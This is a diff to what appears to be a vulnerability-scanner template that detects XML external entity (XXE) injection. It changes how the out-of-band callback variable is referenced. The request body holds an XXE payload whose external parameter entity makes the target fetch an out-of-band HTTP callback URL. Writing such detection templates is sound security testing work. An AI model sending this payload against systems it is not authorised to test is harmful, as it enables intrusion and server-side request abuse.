@@ -14,8 +14,6 @@ info:
   created: 2025/08/20
 
 set:
-  oob: oob()
-  oobHTTP: oob.HTTP
   hostname: request.url.host
 
 rules:
@@ -28,8 +26,8 @@ rules:
       body: |
         <?xml version="1.0" encoding="UTF-8"?>
         <!DOCTYPE root [
-        <!ENTITY % remote SYSTEM "{{oobHTTP}}/xxe_test">
+        <!ENTITY % remote SYSTEM "{{oob.HTTP}}/xxe_test">
         %remote;]>
-    expression: response.status == 200 && oobCheck(oob, oob.ProtocolHTTP, 3)
+    expression: response.status == 200 && oobCheck(oob.ProtocolHTTP, 3)
 
 expression: r0()
